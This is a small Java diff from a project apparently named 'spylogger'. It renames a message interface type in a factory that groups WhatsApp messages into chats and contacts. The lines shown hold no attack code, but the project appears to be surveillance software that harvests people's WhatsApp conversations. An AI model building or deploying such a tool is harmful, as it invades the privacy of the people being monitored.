@@ -1,6 +1,6 @@
 package com.gravatasufoca.spylogger;
 
-import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.MensagenInterface;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
 import com.gravatasufoca.spylogger.model.whatsapp.Messages;
@@ -40,7 +40,7 @@ public class ChatVOFactory {
     private List<ChatVO> getWhatsAppChats(List<Messages> mensagens){
         Map<ChatList, List<Messages>> chatsMessages=new HashMap<>();
         Map<String, ContatoVO> contatos=new HashMap<>();
-        for(Mensagem me: mensagens){
+        for(MensagenInterface me: mensagens){
             Messages m=(Messages)me;
 
             if(m.getChatList()==null)continue;;
